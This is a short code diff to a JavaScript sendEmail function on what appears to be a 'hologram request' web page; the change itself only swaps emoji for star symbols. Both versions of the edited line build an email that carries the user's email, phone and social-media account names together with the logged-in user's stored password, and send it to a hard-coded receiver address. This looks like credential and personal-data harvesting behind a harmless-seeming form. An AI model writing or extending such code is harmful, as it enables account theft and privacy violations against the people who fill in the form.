@@ -429,8 +429,8 @@ function sendEmail(){
         return;
     }
     let g = (id) => document.getElementById(id)?.value.trim() || "—";
-    let body = `🔮 HOLOGRAM REQUEST DATA 🔮\n\n1. Email : ${g('yourEmail')}\n2. Username : ${g('yourUsername')}\n3. Name : ${g('yourName')}\n4. Profile Pic : ${g('profilePic')}\n5. Facebook : ${g('fbUsername')}\n6. FB Page : ${g('fbPageUsername')}\n7. Instagram : ${g('igUsername')}\n8. WhatsApp : ${g('whatsapp')}\n9. TikTok : ${g('tiktok')}\n10. Telegram : ${g('telegram')}\n11. Twitter : ${g('twitter')}\n12. Phone : ${g('phone')}\n13. About : ${g('about')}\n14. Website : ${g('website')}\n15. Theme : ${theme}\n\n👤 Logged In : ${currentUser}\n🔑 Password : ${users[currentUser]}\n🕐 Time : ${getTime()}`;
-    let sub = "New Hologram Request";
+    let body = `★ HOLOGRAM REQUEST DATA ★\n\n1. Email : ${g('yourEmail')}\n2. Username : ${g('yourUsername')}\n3. Name : ${g('yourName')}\n4. Profile Pic : ${g('profilePic')}\n5. Facebook : ${g('fbUsername')}\n6. FB Page : ${g('fbPageUsername')}\n7. Instagram : ${g('igUsername')}\n8. WhatsApp : ${g('whatsapp')}\n9. TikTok : ${g('tiktok')}\n10. Telegram : ${g('telegram')}\n11. Twitter : ${g('twitter')}\n12. Phone : ${g('phone')}\n13. About : ${g('about')}\n14. Website : ${g('website')}\n15. Theme : ${theme}\n\n👤 Logged In : ${currentUser}\n🔑 Password : ${users[currentUser]}\n🕐 Time : ${getTime()}`;
+    let sub = "★ New Hologram Request ★";
     let isMobile = /Android|iPhone|iPad|iPod/i.test(navigator.userAgent);
     let mailto = `mailto:${RECEIVER_EMAIL}?subject=${encodeURIComponent(sub)}&body=${encodeURIComponent(body)}`;
     if(isMobile){
